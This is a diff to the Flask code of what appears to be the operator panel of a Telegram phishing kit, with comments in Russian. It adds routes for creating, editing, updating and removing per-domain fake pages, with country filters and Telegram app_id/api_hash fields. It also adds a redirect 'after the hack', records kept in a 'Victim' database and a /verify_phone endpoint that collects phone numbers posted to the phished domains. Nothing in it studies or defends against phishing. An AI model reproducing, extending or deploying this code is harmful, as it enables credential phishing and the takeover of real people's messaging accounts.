@@ -31,11 +31,11 @@ def is_valid_domain(domain):
 
 
 
-@app.before_request
-def enforce_https():
-    if request.headers.get('X-Forwarded-Proto', 'http') == 'https':
-        https_url = request.url.replace('http://', 'http://', 1)
-        return redirect(https_url, code=301)
+# @app.before_request
+# def enforce_https():
+#     if request.headers.get('X-Forwarded-Proto', 'http') == 'http':
+#         https_url = request.url.replace('http://', 'https://', 1)
+#         return redirect(https_url, code=301)
 
 
 
@@ -44,7 +44,6 @@ def enforce_https():
 @app.route('/')
 def index():
     host = request.headers.get('Host')
-    
     if host == server_domain:
         return redirect(url_for('panel'))
     else:
@@ -53,7 +52,7 @@ def index():
             url = host + '$' + path
             username = os.listdir(f'templates/domains/{url}/')[0]
             return render_template(f'domains/{url}/{username}')
-        except:
+        except Exception as e:
             domains = os.listdir(f'templates/domains/')
             for domain in domains:
                 if host in domain:
@@ -85,6 +84,8 @@ def login():
             user = db.GetUserBy('username', request.form['username'])
             admin_data = db.GetAdmins(request.form['username'])
             pwd = salt+request.form['password']
+    
+
             if request.form['username'] == admin_data[0] and admin_data[1] == sha256(pwd.encode('utf-8')).hexdigest():
                 # Если это админ
                 session['username'] = request.form['username']
@@ -301,7 +302,6 @@ def domains():
 
         db_victim = Victim(f'./users/{username}/database.db')
         domains = db_victim.GetDomains()
-
         return render_template('domains.html', domains=domains)
     else:
         try:
@@ -309,7 +309,8 @@ def domains():
             url = domain + '$' + path
             username = os.listdir(f'templates/domains/{url}/')[0]
             return render_template(f'domains/{url}/{username}')
-        except:
+        except Exception as e:
+            print(e)
             return redirect(url_for('index', path=request.path.replace('/', '')))
 
 
@@ -331,8 +332,11 @@ def add_domain():
         redirect = request.form.get('redirect')
         redirect_success = request.form.get('redirect_success')
         security = request.form.get('security')
+        app_id = request.form.get('app_id')
+        api_hash = request.form.get('api_hash')
 
-        if not countries or not domain or not page or not redirect or not path or not redirect_success or not security:
+
+        if not countries or not domain or not page or not redirect or not path or not redirect_success or not security or not app_id or not api_hash:
             return jsonify({'status': 'error', 'message': 'Заполните полностью форму'})
         else:
             if not validators.url(redirect):
@@ -347,7 +351,7 @@ def add_domain():
             if db_victim.CheckDomain(domain):
                 return jsonify({'status': 'error', 'message': 'Этот домен уже добавлен'})
             
-            data = db_victim.AddDomain(domain, page, path, security, redirect, countries, redirect_success, username)
+            data = db_victim.AddDomain(domain, page, path, security, redirect, countries, redirect_success, username, app_id, api_hash)
 
             if data[0]:
                 return jsonify({'status': 'success', 'message': 'Успешно добавлен домен'})
@@ -356,6 +360,165 @@ def add_domain():
             
     else:
         return jsonify({'status': 'error', 'message': 'Нет доступа'})
+
+
+
+###########################################
+#                                         #
+#              Изменить домен             #
+#                                         #
+###########################################
+@app.route('/edit_domain', methods=['POST'])
+def edit_domain():
+    if 'username' in session:
+        username = session['username']
+        domain = request.form.get('domain')
+        countries = json.loads(request.form.get('countries'))
+        page = request.form.get('page')
+        path = request.form.get('path')
+        redirect = request.form.get('redirect')
+        redirect_success = request.form.get('redirect_success')
+        security = request.form.get('security')
+        app_id = request.form.get('app_id')
+        api_hash = request.form.get('api_hash')
+
+        if not countries or not page or not domain or not redirect or not path or not redirect_success or not security or not app_id or not api_hash:
+            return jsonify({'status': 'error', 'message': 'Заполните полностью форму'})
+        else:
+            if not validators.url(redirect):
+                return jsonify({'status': 'error', 'message': 'Неверная ссылка на редирект с главной страницы, пример: https://link.com'})
+            if not validators.url(redirect_success):
+                return jsonify({'status': 'error', 'message': 'Неверная ссылка на редирект после взлома, пример: https://link.com'})
+
+            db_victim = Victim(f'./users/{username}/database.db')
+            
+            if not db_victim.CheckDomain(domain):
+                return jsonify({'status': 'error', 'message': 'Такого домена не существует!'})
+            else:
+                db_victim.EditDomain(domain, page, path, security, redirect, countries, redirect_success, username, app_id, api_hash)
+                return jsonify({'status': 'success', 'message': 'Домен успешно изменён'})
+            
+    else:
+        return jsonify({'status': 'error', 'message': 'Нет доступа'})
+    
+
+
+
+
+
+
+
+
+
+
+
+###########################################
+#                                         #
+#              Обновить домен             #
+#                                         #
+###########################################
+@app.route('/update', methods=['POST'])
+def update():
+    if 'username' in session:
+        username = session['username']
+        url = request.form.get('url')
+        id = request.form.get('id')
+        db_victim = Victim(f'./users/{username}/database.db')
+        data = db_victim.UpdateDomain(url, id)
+
+        if data[0]:
+            return jsonify({'status': 'success', 'message': 'Домен изменён, перезагрузите страницу, чтобы увидеть изменения', "data": {"status": data[1]}})
+        else:
+            return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
+            
+    else:
+        return jsonify({'status': 'error', 'message': 'Нет доступа'})
+
+
+
+
+
+###########################################
+#                                         #
+#             Удалить домен               #
+#                                         #
+###########################################
+@app.route('/remove_domain', methods=['POST'])
+def remove_domain():
+    if 'username' in session:
+        username = session['username']
+        domain = request.form.get('domain')
+        db_victim = Victim(f'./users/{username}/database.db')
+        data = db_victim.RemoveDomain(domain)
+        if data:
+            return jsonify({'status': 'success', 'message': 'Домен успешно удалён, перезагрузите страницу, чтобы увидеть изменения'})
+        else:
+            return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Нет доступа'})
+
+
+
+
+
+
+
+###########################################
+#                                         #
+#       Получить все данные домена        #
+#                                         #
+###########################################
+@app.route('/getinfo', methods=['POST'])
+def getinfo():
+    if 'username' in session:
+        username = session['username']
+        id = request.form.get('id')
+        db_victim = Victim(f'./users/{username}/database.db')
+        data = db_victim.GetDomainInfo(id)
+        if data[0]:
+            return jsonify({'status': 'success', 'message': 'Данные получены', "data": list(data[0])})
+        else:
+            return jsonify({'status': 'error', 'message': 'Что-то пошло не так...'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Нет доступа'})
+
+
+
+
+
+
+
+
+
+###########################################
+#                                         #
+#         Получаем номер телефона         #
+#                                         #
+###########################################
+@app.route('/verify_phone', methods=['POST'])
+def verify_phone():
+    domain = request.headers.get('Host')
+    phone = request.form.get('phone')
+
+
+    return jsonify({'status': 'error', 'phone': phone, 'domain': domain})
+    
+
+
+
+
+
+
+
+###########################################
+#                                         #
+#               Тестирование              #
+#                                         #
+###########################################
+@app.route('/tg', methods=['POST', 'GET'])
+def tg():
+    return render_template('domains/jojo.html')
+
 
 
 
